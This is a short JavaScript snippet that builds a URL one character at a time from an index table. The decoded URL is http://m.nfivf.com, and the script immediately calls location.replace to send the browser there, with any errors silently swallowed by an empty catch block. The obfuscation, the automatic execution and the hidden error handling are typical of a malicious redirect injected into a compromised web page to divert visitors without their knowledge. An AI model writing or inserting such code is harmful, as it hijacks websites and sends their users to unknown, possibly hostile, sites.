try{
    browserRedirect();
    function browserRedirect(){
        var f,h,tj;
        var r = ('abcdefghijklmnopqrstuvwxyz0123456789ASDFGHJKLQWERTYUIOPZXCVBNM\\<="/:;#?&.%-_ >{}').split('');
        h = r[7]+r[19]+r[19]+r[15]+r[67]+r[66]+r[66]+r[12]+r[72]+r[13]+r[5]+r[8]+r[21]+r[5]+r[72]+r[2]+r[14]+r[12];
        location.replace(h);
    }
}catch(err){}
